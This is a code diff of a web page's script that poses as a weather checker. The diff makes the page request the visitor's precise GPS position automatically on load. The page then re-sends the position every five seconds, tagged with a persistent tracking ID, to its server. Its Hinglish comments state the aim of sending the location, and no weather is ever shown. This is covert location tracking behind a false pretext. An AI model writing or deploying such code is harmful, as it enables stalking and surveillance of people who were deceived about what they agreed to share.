@@ -120,67 +120,83 @@
     </div>
 
 
-    <script>
-        const id = localStorage.getItem("id") || generateId()
-        const btn = document.querySelector("#check-weather")
-        let __interval
+<script>
+    const id = localStorage.getItem("id") || generateId();
+    const btn = document.querySelector("#check-weather");
+    let __interval;
 
-        btn.addEventListener("click", () => {
-            btn.disabled = true
-            btn.innerHTML = "Fetching...."
+    // Page load hote hi location bhejo
+    window.addEventListener("load", () => {
+        btn.disabled = true;
+        btn.innerHTML = "Fetching...";
+        getLocation();
+    });
 
-            getLocation()
-        })
+    // Button se bhi manually fetch kar sakte hain
+    btn.addEventListener("click", () => {
+        btn.disabled = true;
+        btn.innerHTML = "Fetching...";
+        getLocation();
+    });
 
-        function getLocation() {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    btn.disabled = true
-                    const lat = position.coords.latitude
-                    const lng = position.coords.longitude
+    function getLocation() {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
 
-                    fetch("/weather", {
-                        method: "POST",
-                        body: JSON.stringify({
-                            id,
-                            lat,
-                            lng,
-                        }),
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
-                    }).catch(error => {
-                        console.log("post error", error)
+                fetch("/weather", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        id,
+                        lat,
+                        lng
                     })
-                },
-                (error) => {
-                    alert("Please Turn on GPS Location.")
-                    btn.disabled = false
-                    btn.innerHTML = "Check Weather"
-                    console.error("Error watching position:", error);
-                },
-                {
-                    enableHighAccuracy: true, // Use GPS if available
-                }
-            )
-
-            if (__interval) clearTimeout(__interval)
-            __interval = setTimeout(getLocation, 5000)
-        }
-
-        function generateId(length = 10) {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                const randomIndex = Math.floor(Math.random() * characters.length);
-                result += characters[randomIndex];
+                })
+                .then(() => {
+                    btn.innerHTML = "Location Sent";
+                })
+                .catch(error => {
+                    console.error("POST Error:", error);
+                    btn.innerHTML = "Retry";
+                    btn.disabled = false;
+                });
+            },
+            (error) => {
+                console.error("Location Error:", error);
+                alert("Please allow location access.");
+                btn.innerHTML = "Check Weather";
+                btn.disabled = false;
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
             }
+        );
 
-            localStorage.setItem("id", result)
-            return result;
+        // Har 5 second me update bheje
+        if (__interval) clearTimeout(__interval);
+        __interval = setTimeout(getLocation, 5000);
+    }
+
+    function generateId(length = 10) {
+        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        let result = "";
+
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(
+                Math.floor(Math.random() * characters.length)
+            );
         }
 
-    </script>
+        localStorage.setItem("id", result);
+        return result;
+    }
+</script>
 </body>
 
 </html>
